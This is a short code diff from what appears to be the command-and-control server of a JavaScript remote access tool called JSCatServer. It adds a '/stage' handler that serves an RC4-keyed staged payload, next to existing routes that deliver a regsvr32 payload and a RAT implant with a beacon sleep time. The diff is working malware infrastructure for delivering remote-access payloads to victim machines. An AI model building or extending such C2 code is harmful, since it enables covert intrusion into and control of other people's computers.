@@ -91,6 +91,11 @@ class JSCatServer(BaseHTTPRequestHandler):
             context = Payload.regsvr(self.server.host, self.server.port)
             Log.log_message('\n[+]received {} client:{}'.format(BOLD("REGSVR32"),
                                                                 BOLD(self.client_address[0])), log_type=Log.SERVER)
+        elif self.path == '/stage':
+            context = Payload.stage(
+                self.server.host, self.server.port, self.server.rc4_key)
+            Log.log_message('\n[+]received {} client:{}'.format(BOLD('STAGE'),
+                                                                BOLD(self.client_address[0])), log_type=Log.SERVER)
         elif self.path == '/rat':
             context = Payload.rat(
                 self.server.host, self.server.port, self.server.rc4_key, self.server.sleep_time)
@@ -98,7 +103,6 @@ class JSCatServer(BaseHTTPRequestHandler):
                 self.client_address[0])
             Log.log_message('\n[+]received {} client:{}'.format(BOLD('RAT'),
                                                                 BOLD(self.client_address[0])), log_type=Log.SERVER)
-
         self.__to_reply(200, context)
 
     '''
